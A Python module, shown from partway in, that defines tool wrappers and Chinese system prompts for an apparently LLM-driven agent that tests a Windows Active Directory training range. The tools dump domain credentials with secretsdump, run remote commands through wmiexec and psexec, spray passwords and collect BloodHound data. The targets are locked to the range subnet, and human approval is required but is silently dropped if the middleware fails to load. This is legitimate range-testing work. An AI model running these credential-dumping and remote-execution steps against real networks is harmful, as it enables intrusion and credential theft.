            results.append({"vuln_id": vid, "name": tc.name, "status": "error", "evidence": blocked})
            continue
        rc, out, err = _run(argv)
        r = tc.verdict(rc, out, err)
        results.append({"vuln_id": vid, "name": tc.name, "status": r.status,
                        "evidence": r.evidence[:300]})
    return json.dumps(results, ensure_ascii=False)


@tool
def get_range_info() -> str:
    """取得 range 基本資訊: 網域、DC IP、**全部**機器清單 (含每台的角色猜測/服務標籤/
    開放 port)、服務端點。回傳 JSON。攻擊面不等於 DC —— 這裡列的每一台都可能是切入點,
    尤其 services 含 "http" 的主機,值得用 web_fetch_range/run_tool(whatweb/nikto/
    gobuster)/web_dirbust_range 另外做網頁滲透,不要只盯著 DC。
    白箱模式含更多細節。"""
    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
    info = {
        "ad_domain": _MF["ad_domain"],
        "dc_ip": dc["ip"] if dc else None,
        "network_cidr": _MF["network_cidr"],
        "machines": [{"hostname": m["hostname"], "role": m["role"], "ip": m["ip"],
                      "services": m.get("services", []), "open_ports": m.get("open_ports", [])}
                     for m in _MF["machines"]],
        "web_hosts": [m["ip"] for m in _MF["machines"] if "http" in m.get("services", [])],
        "mode": _MODE,
        "no_manifest": _NO_MANIFEST,
    }
    if _MODE == "whitebox":
        info["endpoints"] = _MF.get("endpoints", [])
    return json.dumps(info, ensure_ascii=False)


@tool
def run_validation() -> str:
    """跑基礎設施驗證 (DNS/LDAP/SMB/Kerberos 可連線)。應在測試弱點前先跑。
    回傳每項的 pass/fail + evidence。"""
    results = []
    for tc in tcs.VALIDATE_CASES:
        argv = tc.build_cmd(_MF, {})
        blocked = _assert_in_range(argv)
        if blocked:
            results.append({"check": tc.name, "status": "error", "evidence": blocked})
            continue
        rc, out, err = _run(argv)
        r = tc.verdict(rc, out, err)
        results.append({"check": tc.name, "status": r.status,
                        "evidence": r.evidence[:200]})
    return json.dumps(results, ensure_ascii=False)


@tool
def test_vuln(vuln_id: int) -> str:
    """對單一種下的弱點執行驗證測試,確認它真的可被利用。
    vuln_id 必須是 manifest 中已種下的弱點編號。
    工具會用固定的驗證指令 (impacket/nxc/ldapsearch) 並鎖定 range 目標。
    回傳 status (pass=可利用 / fail=種了但打不通 / error / skip) 與 evidence。"""
    # 確認是已種弱點
    planted_ids = {v["id"] for v in _MF.get("planted_vulns", [])}
    if vuln_id not in planted_ids:
        return json.dumps({"status": "skip",
                           "evidence": f"vuln #{vuln_id} not in manifest"}, ensure_ascii=False)
    # BloodHound 類單獨處理
    if vuln_id in tcs.BH_VULNS:
        return json.dumps({"status": "skip",
                           "evidence": f"#{vuln_id} needs bloodhound_verify (ACL edge)"},
                          ensure_ascii=False)
    tc = tcs.get_test_case(vuln_id)
    if tc is None:
        return json.dumps({"status": "skip",
                           "evidence": f"#{vuln_id} has no direct tool test (template LLM-drafted; verify manually)"},
                          ensure_ascii=False)
    # 需要犧牲帳號但沒有 → skip
    if tc.needs_creds and not (_MF.get("qa_credential") or {}).get("password"):
        return json.dumps({"status": "skip",
                           "evidence": "no QA sacrificial credential in manifest"},
                          ensure_ascii=False)
    params = next((v["params"] for v in _MF["planted_vulns"] if v["id"] == vuln_id), {})
    argv = tc.build_cmd(_MF, params)
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err = _run(argv)
    r = tc.verdict(rc, out, err)
    return json.dumps({"status": r.status, "tool": tc.tool,
                       "cmd": " ".join(argv), "evidence": r.evidence[:400]},
                      ensure_ascii=False)


@tool
def bloodhound_verify(vuln_id: int) -> str:
    """用 BloodHound 驗證 ACL 類弱點 (GenericAll/ForceChangePassword/DCSync) 的攻擊路徑是否存在。
    會先用 QA 帳號採集,再對種下的弱點下對應 Cypher。
    回傳採集狀態與該弱點的 Cypher (供在 BloodHound CE 執行確認)。"""
    if vuln_id not in tcs.BH_VULNS:
        return json.dumps({"status": "skip",
                           "evidence": f"#{vuln_id} not a BloodHound-verified vuln"},
                          ensure_ascii=False)
    v = next((x for x in _MF["planted_vulns"] if x["id"] == vuln_id), None)
    if not v:
        return json.dumps({"status": "skip", "evidence": "not planted"}, ensure_ascii=False)
    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
    u, pw = (_MF.get("qa_credential") or {}).get("username", ""), \
            (_MF.get("qa_credential") or {}).get("password", "")
    argv = ["bloodhound-python", "-d", _MF["ad_domain"], "-u", u, "-p", pw,
            "-ns", dc["ip"] if dc else "", "-c", "All", "--zip"]
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err = _run(argv)
    collected = "found" in (out + err).lower() or rc == 0
    return json.dumps({
        "status": "collected" if collected else "collect_failed",
        "cypher": v.get("bh_cypher"),
        "note": "在 BloodHound CE 執行 cypher 確認邊存在。空結果=種植失敗。",
        "evidence": (out + err)[-300:],
    }, ensure_ascii=False)


@tool
def whitebox_check_setting(vuln_id: int) -> str:
    """[白箱限定] 透過登入 DC 直接檢查某弱點的實際設定值 (根因分析用)。
    黑箱模式下拒絕。用於 debug: 當 test_vuln 回 fail 時,查為什麼沒種成功。"""
    if _MODE != "whitebox":
        return json.dumps({"status": "denied",
                           "evidence": "whitebox mode required"}, ensure_ascii=False)
    # 這裡回傳「應檢查什麼」而非實際登入 (實際登入需 DA 憑證 / MCP run_command_on_host)
    checks = {
        1: "Get-ADUser <user> -Properties DoesNotRequirePreAuth",
        2: "Get-ADUser <svc> -Properties ServicePrincipalNames,msDS-SupportedEncryptionTypes",
        15: "Get-ADComputer <host> -Properties TrustedForDelegation",
        66: "dsacls '<domain DN>' | Select-String 'Replicating Directory Changes'",
        136: r"reg query HKLM\SYSTEM\...\LanManServer\Parameters /v RequireSecuritySignature",
        160: "Get-ADObject <domain DN> -Properties ms-DS-MachineAccountQuota",
    }
    return json.dumps({"status": "whitebox",
                       "check_command": checks.get(vuln_id, "(no whitebox check defined)"),
                       "note": "透過 MCP run_command_on_host 或 DA 憑證執行以確認實際值"},
                      ensure_ascii=False)


# ═══════════════════════════════════════════════════════════════════════════
# debug 工具 (HITL 保護 — 會修改 range)
# ═══════════════════════════════════════════════════════════════════════════
@tool
def suggest_fix(vuln_id: int, reason: str) -> str:
    """當 test_vuln 回 fail 時,提出修復建議 (重跑對應的 Ansible task)。
    這只是**建議**,不直接執行。實際重跑需操作者確認並透過 cyberrange agent / ludus-mcp。
    reason: 你判斷失敗的原因。"""
    v = next((x for x in _MF["planted_vulns"] if x["id"] == vuln_id), None)
    name = v["name"] if v else f"#{vuln_id}"
    return json.dumps({
        "vuln_id": vuln_id, "name": name, "diagnosis": reason,
        "suggested_action": f"re-run Ansible task tagged 'id-{vuln_id}' on DC via ludus-mcp",
        "requires_human_approval": True,
    }, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════════════════════
# 高風險驗證工具 (真的登入機器 / 傾印憑證 / 執行指令) —— 每次呼叫都需 HITL 核准。
# 這些不是「掃描/偵察」,是真的觸碰主機,所以獨立成專用工具 (而非塞進 run_tool 的
# 允許清單),讓 HITL middleware 用工具名稱就能攔下每一次呼叫,而不必在 run_tool
# 內部另外判斷 binary 是不是高風險。
# ═══════════════════════════════════════════════════════════════════════════
def _qa_or_error() -> tuple[Optional[dict], Optional[str]]:
    cred = _MF.get("qa_credential") or {}
    if not cred.get("password") and not cred.get("ntlm_hash"):
        return None, json.dumps({"status": "error",
                                 "evidence": "沒有可用憑證 (qa_credential 為空)。先用 "
                                             "enum_users/asrep_roast_open/crack_hash/"
                                             "password_spray 拿到憑證再呼叫這個。"},
                                ensure_ascii=False)
    return cred, None


@tool
def secretsdump_dc(target_ip: str = "") -> str:
    """[高風險 — 需 HITL 核准] 用 impacket-secretsdump 對目標主機傾印本機 SAM / 網域
    NTDS.dit (若目標是 DC 且憑證權限足夠)。這是「證明可以拿到全網域憑證」的最終驗證,
    不是偵察,執行前一定會被要求人工 approve/reject。
    target_ip 留空預設打 manifest 裡的 DC。需要先有 qa_credential (或更高權限憑證)
    才會執行,沒有的話回 error,不會自己亂猜密碼。"""
    cred, err = _qa_or_error()
    if err:
        return err
    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
    ip = target_ip or (dc["ip"] if dc else "")
    if not ip:
        return json.dumps({"status": "error", "evidence": "找不到目標 IP"}, ensure_ascii=False)
    u, pw, dom = cred.get("username", ""), cred.get("password", ""), cred.get("domain", "")
    argv = ["impacket-secretsdump", f"{dom}/{u}:{pw}@{ip}"]
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err_out = _run(argv)
    got_hashes = bool(re.search(r":::\s*$|:\$[A-Za-z0-9]+\$", out, re.MULTILINE))
    return json.dumps({"status": "dumped" if got_hashes else "failed",
                       "cmd": " ".join(argv[:-1] + [f"{dom}/{u}:[REDACTED]@{ip}"]),
                       "evidence": (out + err_out)[-1500:]}, ensure_ascii=False)


@tool
def wmiexec_run(target_ip: str, command: str) -> str:
    """[高風險 — 需 HITL 核准] 用 impacket-wmiexec 對目標主機用現有憑證執行一條指令
    (WMI,半互動式)。用來驗證「憑證真的能拿到程式碼執行」,執行前一定會被要求人工
    approve/reject。command 應該是唯讀/驗證性質的指令 (如 whoami、hostname),不要下
    破壞性指令 (刪檔、關機、改設定...) —— 這個工具不會另外檢查 command 內容是否安全,
    人工核准時要自己看清楚 command 是什麼。"""
    cred, err = _qa_or_error()
    if err:
        return err
    u, pw, dom = cred.get("username", ""), cred.get("password", ""), cred.get("domain", "")
    argv = ["impacket-wmiexec", "-command", command, f"{dom}/{u}:{pw}@{target_ip}"]
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err_out = _run(argv)
    return json.dumps({"status": "ok" if rc == 0 else "failed",
                       "cmd": f"impacket-wmiexec -command {command!r} "
                              f"{dom}/{u}:[REDACTED]@{target_ip}",
                       "output": out[-2000:], "stderr": err_out[-500:]}, ensure_ascii=False)


@tool
def psexec_run(target_ip: str, command: str = "") -> str:
    """[高風險 — 需 HITL 核准] 用 impacket-psexec 對目標主機用現有憑證取得執行權限
    (服務植入式,比 wmiexec 更侵入性)。command 留空會開互動式 shell (不適合非互動的
    agent 流程,建議一定要帶 command 明確指定要跑什麼)。同 wmiexec_run,只做唯讀/
    驗證性質的指令,執行前一定會被要求人工 approve/reject,人工核准時要自己看清楚
    command 是什麼。"""
    cred, err = _qa_or_error()
    if err:
        return err
    u, pw, dom = cred.get("username", ""), cred.get("password", ""), cred.get("domain", "")
    argv = ["impacket-psexec", f"{dom}/{u}:{pw}@{target_ip}"]
    if command:
        argv += ["-c", command]
    blocked = _assert_in_range(argv)
    if blocked:
        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
    rc, out, err_out = _run(argv)
    return json.dumps({"status": "ok" if rc == 0 else "failed",
                       "cmd": f"impacket-psexec {dom}/{u}:[REDACTED]@{target_ip}"
                              + (f" -c {command!r}" if command else ""),
                       "output": out[-2000:], "stderr": err_out[-500:]}, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════════════════════
# 最後手段: 真的走投無路才問人。這是「LLM-driven」的安全閥,不是預設互動點 ——
# 只有在你已經窮盡所有自主手段、卡在一個非你能決定的問題上 (例如需要 range 以外的
# 資訊、需要人給某個環境細節、或需要授權做超出目前工具範圍的動作) 時才呼叫。
# 不允許拿它來當「不確定下一步」的偷懶出口。
# ═══════════════════════════════════════════════════════════════════════════
def _blocking_ask(question: str, tried: str) -> str:
    """在 CLI 上直接問人並等回覆 (阻塞)。非互動環境 (stdin 不是 tty) 回制式訊息,
    讓 agent 知道現在沒人可問,要嘛換手法要嘛把它寫進報告的 open question。"""
    print("\n" + "─" * 60)
    print("[ASK-HUMAN] agent 判斷自己卡住了,需要你的協助:")
    print(f"  問題: {question}")
    if tried:
        print(f"  已嘗試: {tried}")
    print("─" * 60)
    try:
        if not sys.stdin or not sys.stdin.isatty():
            return ("[NO_HUMAN_AVAILABLE] 目前非互動環境,沒有人可回答。請改用其他自主手段"
                    "繼續嘗試;若真的無法,把這個問題當成報告裡的 open question 記下,不要"
                    "反覆呼叫 ask_human。")
        ans = input("你的回覆 (直接 Enter = 沒有補充,請自行想辦法)> ").strip()
    except (EOFError, KeyboardInterrupt):
        return "[NO_HUMAN_AVAILABLE] 讀取回覆失敗,請自行想辦法或記入報告。"
    return ans or ("[NO_EXTRA_INFO] 人類沒有補充資訊,請用你手上的工具自己繼續想辦法,"
                   "不要再問同一件事。")


@tool
def ask_human(question: str, what_i_tried: str = "") -> str:
    """[最後手段 — 只在真的卡死時用] 當你已經**窮盡所有能自主嘗試的手段**、且卡在一個
    不是你有辦法靠現有工具解決的問題上 (例如: 需要 range 以外才知道的資訊、需要人提供
    某個環境前提、或想做的事超出目前所有工具能涵蓋的範圍) 時,呼叫這個問人。
    這是 LLM-driven 流程的安全閥,不是給你「不確定下一步」時偷懶用的 —— 呼叫前你必須
    已經真的試過多種方法。
    question: 你要問人的具體問題 (講清楚你卡在哪、需要什麼)。
    what_i_tried: 你已經試過哪些手段 (讓人知道你不是還沒努力就先問)。
    回傳人的回覆;若當下沒人可回答 (非互動環境或對方沒補充),你要用回覆裡的指示繼續
    自己想辦法,不要反覆問同一件事。"""
    return _blocking_ask(question, what_i_tried)


QA_TOOLS = [list_planted_vulns, get_range_info, run_validation, test_vuln,
            bloodhound_verify, whitebox_check_setting, suggest_fix, generic_ad_audit,
            enum_users, asrep_roast_open, password_spray,
            run_tool, crack_hash, web_fetch_range, web_dirbust_range,
            secretsdump_dc, wmiexec_run, psexec_run, ask_human]

# 需要 HITL 確認的工具 (破壞性、鎖帳風險、或真的登入/執行於機器上)
HITL_TOOLS = {"suggest_fix", "password_spray", "secretsdump_dc", "wmiexec_run", "psexec_run"}


# ═══════════════════════════════════════════════════════════════════════════
# 報告 schema (LLM 最終結構化輸出)
# ═══════════════════════════════════════════════════════════════════════════
class VulnQAResult(BaseModel):
    vuln_id: int
    name: str
    status: Literal["exploitable", "planted_but_broken", "not_tested", "error"]
    evidence: str = ""


class QAReport(BaseModel):
    range_id: str
    mode: str
    infra_ok: bool = Field(description="基礎設施驗證是否全數通過")
    results: list[VulnQAResult]
    summary: str = Field(description="人類可讀的總結,含建議")


# ═══════════════════════════════════════════════════════════════════════════
# Agent 建構
# ═══════════════════════════════════════════════════════════════════════════
QA_SYSTEM = """你是靶場 QA 工程師,對一個 Windows AD 訓練靶場做滲透式驗證。
你所有工具都是在 **kali attack host** 上執行的 (不是你自己的沙箱)。工具說明裡列的預設
路徑/候選清單 (例如 crack_hash 找 rockyou.txt) 只是常見猜測,如果都找不到,不要就這樣
放棄或回報「找不到」—— 用 run_tool 呼叫 find/locate/which 去 kali 上實際找 (例如常見的
/usr/share/wordlists/、/usr/share/seclists/、/usr/share/john/ 底下),自己判斷該去哪找、
找到就用,這也是你自主判斷範圍的一部分。
你有一組工具,怎麼組合、跑幾輪、要不要繞路都由你自己判斷,不是死板的固定順序:

- list_planted_vulns / test_vuln / bloodhound_verify: 對 manifest 中種下的弱點做既定驗證。
- get_range_info: manifest 內**全部**機器清單 (不是只有 DC),含每台的角色猜測/服務標籤
  (services 含 "http" 就是有 web 服務) /開放 port。**攻擊面不等於 DC** —— 真實環境很少
  直接打穿 DC,通常是先從別的主機 (workstation、對外 web app、有漏洞的內部服務) 找到切入
  點,再橫向移動。看到 web_hosts 有東西,務必花時間用 web_fetch_range/web_dirbust_range/
  run_tool(whatweb/nikto) 認真查,不要看一眼沒東西就跳過。
- run_validation: 基礎設施健檢 (DNS/LDAP/SMB/Kerberos)。
- enum_users / asrep_roast_open / password_spray (需 HITL 核准): 找初始存取,enum_users
  內建串了 4 種列舉手法,還是槓龜的話可以自己想辦法 (猜命名慣例、從 web 服務挖出的員工
  名單反推帳號等)。
- run_tool: 現成工具不夠用時,自己組 nmap/nxc/ldapsearch/impacket-*/hashcat/john/
  whatweb/nikto/gobuster/ffuf 等指令 (允許清單見工具說明),不必受限於 id→testcase 對照表。
- crack_hash: 對拿到的 hash 在本機用真正的字典 (rockyou.txt 等) 做離線破解,不是只核對
  幾個常見密碼。
- web_fetch_range / web_dirbust_range: 對 range 內任何有 http 服務的主機 (不限 DC) 做網頁
  偵察 —— 先 web_dirbust_range 掃目錄/端點,再用 web_fetch_range 深入看有意義的路徑。
  Web app 常常是比 AD 弱點更直接的切入點,不要略過。
- secretsdump_dc / wmiexec_run / psexec_run (需 HITL 核准): 真的登入機器、傾印憑證、
  執行指令 —— 用來對最終「憑證真的能拿到程式碼執行/拿到全網域憑證」做最後一步證明,
  target_ip 不必只打 DC,拿到任何主機的憑證都可以驗證。
- suggest_fix: 對 fail 的弱點提出診斷建議 (需人工核准才算數,不會自己動手修)。

怎麼跑由你自己決定,不是死板的固定順序,也不需要每一步都停下來問。原則是:
**自己不斷推理、不斷嘗試下一個合理的工具呼叫,一路做到你真的想不出還能做什麼、或
剩下的動作都需要人工核准為止,才需要停下來跟人類報告 / 等待核准。** 例如:先摸底
(list_planted_vulns + run_validation),再逐一驗證種下的弱點;遇到卡關 (test_vuln 回
fail 但你覺得可能只是測試手法不夠) 就自己用 run_tool/crack_hash/web_fetch_range 深入查
根因,不必等被告知;查出一條可能的攻擊鏈就往下追,直到需要呼叫 HITL 工具
(password_spray/secretsdump_dc/wmiexec_run/psexec_run) 才停下來讓人核准。不要因為「不確定
下一步該做什麼」就提早結束並丟回一個籠統的報告 —— 先窮盡你手上所有工具能做的。
最後輸出結構化 QA 報告。

這是 **LLM-driven** 的流程: 主導權在你,不要動不動就停下來問人。但如果你真的**已經
窮盡所有能自主嘗試的手段**、卡在一個靠現有工具無論如何都解決不了的問題上 (例如需要
range 以外才知道的資訊、需要人提供某個環境前提、或想做的事超出所有工具能涵蓋的範圍),
可以呼叫 ask_human 問我 —— 這是最後手段,不是「不確定下一步」時的偷懶出口。呼叫 ask_human
前,你必須已經真的試過多種方法;呼叫時要講清楚你卡在哪、試過什麼。如果當下沒人可回答
(非互動環境),就照回覆的指示自己繼續,或把它當報告裡的 open question,不要反覆問同一件事。

重要:
- 工具做確定性的 pass/fail 判定 (regex verdict) 時,你直接採信,不要自己竄改。
- status=pass 代表弱點可利用;fail 代表種了但打不通 (可以自己用 run_tool 等再深入 debug
  找根因);skip 代表無直接測試方法或缺條件。
- 唯一的硬限制是目標鎖定 manifest 內的 range 網段,工具層會強制擋掉範圍外目標;
  這個範圍內,想怎麼查、怎麼組指令都可以自己決定。
- password_spray / secretsdump_dc / wmiexec_run / psexec_run 一定會被要求 HITL 核准,
  不能想辦法繞過;呼叫前先清楚說明你為什麼需要這一步 (例如已經有哪些跡象顯示可能有效)。
- 卡死才用 ask_human,而且要先真的試過多種手段;不要把它當成逃避繼續嘗試的藉口。
- 每一步工具呼叫都會被自動記錄 (逐步 log),不需要你自己額外做記錄動作,只要正常呼叫工具。
"""

QA_SYSTEM_NO_MANIFEST = """你是靶場 QA 工程師。這次**沒有 range_manifest.json**
(可能是對外部/未知環境做稽核,或 manifest 遺失),已由前置步驟對**整個目標網段**做 nmap
掃描,列出所有存活主機 (不是只找 DC) 並猜出網域名 (見 get_range_info)。你不知道這個環境
「種了哪些弱點」,所以整個流程更接近真實黑箱滲透: 沒有現成清單告訴你答案,自己摸索、
自己決定下一步。

**攻擊面不等於 DC。** get_range_info 回傳的 machines 裡,每台都有 services/open_ports,
services 含 "http" 的主機 (也列在 web_hosts) 代表有網頁服務,現實中這種主機常常比直接打
AD 弱點更容易切入 (弱密碼後台、過時 CMS、暴露的管理介面、上傳漏洞...)。**先看一遍
get_range_info 的完整主機清單再決定要往哪個方向查,不要預設「就是打 DC」。**

你所有工具都是在 **kali attack host** 上執行的。工具說明裡列的預設路徑/候選清單 (例如
crack_hash 找 rockyou.txt) 只是常見猜測,如果都找不到,不要就此放棄或回報「找不到」——
用 run_tool 呼叫 find/locate/which 去 kali 上實際找 (常見位置如 /usr/share/wordlists/、
/usr/share/seclists/、/usr/share/john/),自己判斷該去哪找、找到就用。

你手上的工具 (怎麼組合、跳過哪些、多跑幾輪都自己判斷,不是固定管線):
- get_range_info / run_validation: 先搞清楚環境、確認基礎設施正常、看清楚有哪些主機。
- enum_users: 對 DC 串了 4 種匿名列舉手法 (LDAP anon / SMB RID cycle / rpcclient /
  lookupsid) 一次湊帳號清單 (不需憑證)。全槓龜也別放棄,可以從 web 服務挖出的員工名單、
  常見命名慣例自己組帳號猜測,拿去 asrep_roast_open/password_spray 驗證。
- asrep_roast_open: 對列舉到的帳號跑 AS-REP roast (不需憑證);拿到 hash 本身就是可回報
  的發現,工具也會嘗試用內建常見密碼核對明文。
- crack_hash: 想用比內建清單更完整的字典破解 (rockyou.txt 等) 就用這個,不必等
  asrep_roast_open 破不出來才想到。
- run_tool: 想自己嘗試別的列舉/偵察手法 (例如換一種 LDAP 查詢、跑 nmap 服務版本掃描、
  查 SMB 共享、跑 whatweb/nikto...) 就用這個自己組指令,不必等被告知。
- web_fetch_range / web_dirbust_range: get_range_info 的 web_hosts 有任何 IP,都值得花
  時間認真掃 —— 先 web_dirbust_range 找隱藏路徑/管理介面,再 web_fetch_range 深入看。
  這不是選配步驟,是跟打 AD 弱點平行的另一條攻擊路線,常常更好打。
- password_spray (需 HITL 核准): enum_users/asrep_roast_open/crack_hash 都拿不到有效憑證、
  但確實需要驗證身分才能繼續深入時才用,每帳號每密碼只試一次降低鎖帳風險。
- generic_ad_audit: 對已知 AD 弱點清單跑一輪基線掃描,可以早點跑打底,也可以晚點跑補漏。
- secretsdump_dc / wmiexec_run / psexec_run (需 HITL 核准): 有可用憑證後,想證明「真的能
  拿到全網域憑證 / 真的能執行程式碼」時用這幾個,target_ip 可以是 DC 也可以是任何拿到
  憑證/存取權的其他主機,不要預設只打 DC。

沒有固定的第 1234 步 —— 你自己決定探索順序、要不要回頭重試、要不要繞道用 run_tool
補一個沒有現成工具的檢測。**核心原則是自己不斷推理、不斷往下試,一路做到你真的沒有
下一步可做 (該試的列舉/破解/偵察手法都試過了),或者下一步是需要人工核准的高風險動作
(password_spray/secretsdump_dc/wmiexec_run/psexec_run) 時,才停下來。不要在還有其他
可自主嘗試的手段時就提早放棄、丟回一個「沒有憑證所以沒測」的報告。** 找到初始存取
(AS-REP roastable 帳號、弱密碼帳號、破出來的 hash...) 或任何有意義的發現,隨時記下來,
最後整理進報告。

這是 **LLM-driven** 的黑箱滲透: 主導權在你,不要動不動就停下來問人。但如果你真的已經
窮盡所有能自主嘗試的手段、卡在一個靠現有工具解不了的問題上 (需要 range 以外的資訊、
需要人給某個環境前提、或想做的事超出所有工具範圍),可以呼叫 ask_human 問我 —— 這是
最後手段,不是「不確定下一步」的偷懶出口,呼叫前必須真的試過多種方法,呼叫時講清楚你
卡在哪、試過什麼。若當下沒人可回答,照回覆指示自己繼續或記成報告的 open question。

重要:
- 工具做確定性判定時你直接採信,不要自己竄改。
- 唯一的硬限制是目標鎖定探索到的 range 網段 (nmap/curl/impacket 等所有工具共用這道檢查),
  不得對網段外主機下手;這個範圍內怎麼查都可以自己決定,不必受限於預先寫死的流程。
- password_spray / secretsdump_dc / wmiexec_run / psexec_run 有鎖帳/登入機器風險,一定要
  走 HITL 核准,不能因為想省事就跳過或用 run_tool 繞過 (run_tool 的允許清單本來就不含
  這幾類工具)。呼叫前先說明你為什麼判斷值得做這一步。
- 卡死才用 ask_human,而且要先真的試過多種手段;不要把它當成逃避繼續嘗試的藉口。
- 每一步工具呼叫都會被自動記錄 (逐步 log),不需要你自己額外做記錄動作。
- 最後要輸出結構化 QA 報告,status 用 exploitable(可利用)/not_tested(沒測到或缺條件)/
  error 表示;沒有 planted_but_broken 這個狀態的意義 (沒有「種植」動作),不要用它。
"""


def build_llm():
    backend = os.environ.get("CYBERRANGE_LLM_BACKEND", "ollama")
    if backend == "openai":
        from langchain_openai import ChatOpenAI
        return ChatOpenAI(api_key=os.environ.get("OPENAI_API_KEY", ""),
                          model=os.environ.get("LLM_MODEL", "gpt-4o"),
                          temperature=0)
    if backend == "local-openai":
        from langchain_openai import ChatOpenAI
        return ChatOpenAI(base_url=os.environ.get("LLM_BASE_URL", "http://localhost:8000/v1"),
                          api_key=os.environ.get("LLM_API_KEY", "EMPTY"),
                          model=os.environ.get("LLM_MODEL", "llama4:scout"), temperature=0)
    if backend == "ollama":
        from langchain_ollama import ChatOllama
        return ChatOllama(model=os.environ.get("LLM_MODEL", "llama4:scout"),
                          base_url=os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434"),
                          temperature=0)
    return init_chat_model(os.environ.get("CYBERRANGE_MODEL", "anthropic:claude-sonnet-4-6"),
                           temperature=0)


# ═══════════════════════════════════════════════════════════════════════════
# 無條件的每步紀錄 (與 --observe LLM 觀察員無關,永遠開啟)。
# --observe 那套要呼叫 LLM 做因果推理,可能失敗/變慢/需要額外後端;這裡是純寫檔,
# 保證「無時無刻」都有一份逐步 log,不依賴任何外部服務。
# ═══════════════════════════════════════════════════════════════════════════
_STEP_LOG_PATH: Optional[str] = None
_STEP_SEQ = 0
_REDACT_KEYS = {"password", "pw", "ntlm_hash", "qa_pass"}


def _init_step_log(range_id: str, output_dir: str = ".") -> str:
    global _STEP_LOG_PATH, _STEP_SEQ
    _STEP_SEQ = 0
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    _STEP_LOG_PATH = os.path.join(output_dir, f"qa_steps_{range_id}_{ts}.jsonl")
    open(_STEP_LOG_PATH, "w", encoding="utf-8").close()
    return _STEP_LOG_PATH


def _redact(obj):
    if isinstance(obj, dict):
        return {k: ("***REDACTED***" if k in _REDACT_KEYS and v else _redact(v))
                for k, v in obj.items()}
    if isinstance(obj, list):
        return [_redact(x) for x in obj]
    return obj


def _log_step(tool_name: str, tool_input: dict, result: str) -> None:
    """每次工具呼叫都會寫一行 JSONL,不管有沒有開 --observe。"""
    global _STEP_SEQ
    if not _STEP_LOG_PATH:
        return
    _STEP_SEQ += 1
    entry = {"seq": _STEP_SEQ, "ts": datetime.now(timezone.utc).isoformat(),
             "tool": tool_name, "input": _redact(tool_input), "result": result[:2000]}
    try:
        with open(_STEP_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except OSError:
        pass


def _wrap_with_step_log(tools: list) -> list:
    """幫每個工具包一層無條件 log,不改變工具的 name/description/schema。"""
    from functools import wraps
    try:
        from langchain_core.tools import StructuredTool
    except ImportError:
        from langchain.tools import StructuredTool

    wrapped = []
    for t in tools:
        original_func = t.func if hasattr(t, "func") else t
        name = t.name if hasattr(t, "name") else str(t)
        desc = t.description if hasattr(t, "description") else ""
        schema = t.args_schema if hasattr(t, "args_schema") else None

        @wraps(original_func)
        def make_wrapper(orig_fn, orig_name):
            def wrapper(*args, **kwargs):
                result = orig_fn(*args, **kwargs)
                tool_input = dict(kwargs)
                if args:
                    tool_input["_positional"] = list(args)
                _log_step(orig_name, tool_input, result if isinstance(result, str)
                          else json.dumps(result, ensure_ascii=False))
                return result
            return wrapper

        wrapped.append(StructuredTool.from_function(
            func=make_wrapper(original_func, name), name=name, description=desc,
            args_schema=schema,
        ))
    return wrapped


def build_qa_agent(observer=None):
    """用 create_agent + HumanInTheLoopMiddleware 建 QA agent。
    每個工具都會被 _wrap_with_step_log 包一層,無條件寫逐步 log (與 --observe 無關)。
    若另外傳入 observer (ObserverAgent),再疊一層 LLM 因果推理觀察 (選用,較重)。"""
    from langchain.agents import create_agent
    try:
        from langchain.agents.middleware import HumanInTheLoopMiddleware
        mw = [HumanInTheLoopMiddleware(interrupt_on={t: True for t in HITL_TOOLS})]
    except Exception:
        mw = []  # 舊版無 middleware 時退化為無 HITL (仍安全,因高風險工具本身仍受 range 鎖)

    tools = _wrap_with_step_log(QA_TOOLS)
    if observer is not None:
        tools = observer.wrap_qa_tools(tools)

    agent = create_agent(
        model=build_llm(),
        tools=tools,
        system_prompt=QA_SYSTEM_NO_MANIFEST if _NO_MANIFEST else QA_SYSTEM,
        middleware=mw,
        checkpointer=InMemorySaver(),
    )
    return agent


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
def run(a) -> None:
    global _MODE
    _MODE = a.mode
    os.environ.setdefault("CYBERRANGE_LLM_BACKEND", a.backend)
    if a.model:
        os.environ["LLM_MODEL"] = a.model
    if a.ollama_base_url:
        os.environ["OLLAMA_BASE_URL"] = a.ollama_base_url

    try:
        _load(a.manifest, discover_cidr=a.network_cidr, ad_domain=a.ad_domain,
              dc_ip=a.dc_ip, qa_user=a.qa_user, qa_pass=a.qa_pass)
    except SystemExit as e:
        print(str(e))
        return

    if _NO_MANIFEST:
        print(f"[QA] 無 range_manifest.json,已探索組出: {_MF['ad_domain']} / mode={_MODE}")
        print(f"[QA] range network (target-locked): {_RANGE_NET}")
        print(f"[QA] 無種植弱點清單 — 將對已知檢測項目跑基線稽核 (generic_ad_audit)")
    else:
        print(f"[QA] loaded manifest: {_MF['range_id']} / {_MF['ad_domain']} / mode={_MODE}")
        print(f"[QA] range network (target-locked): {_RANGE_NET}")
        print(f"[QA] planted vulns: {[v['id'] for v in _MF.get('planted_vulns', [])]}")

    # HITL: 測試前確認範圍
    if not a.yes:
        ans = input(f"\n即將對 {_RANGE_NET} 內的 range 目標執行唯讀驗證測試。繼續? [y/N] ")
        if ans.strip().lower() != "y":
            print("已取消。")
            return

    # 無條件的逐步 log (無時無刻紀錄每一步,與 --observe 無關,永遠開啟)
    step_log_dir = getattr(a, "observer_output", None) or "."
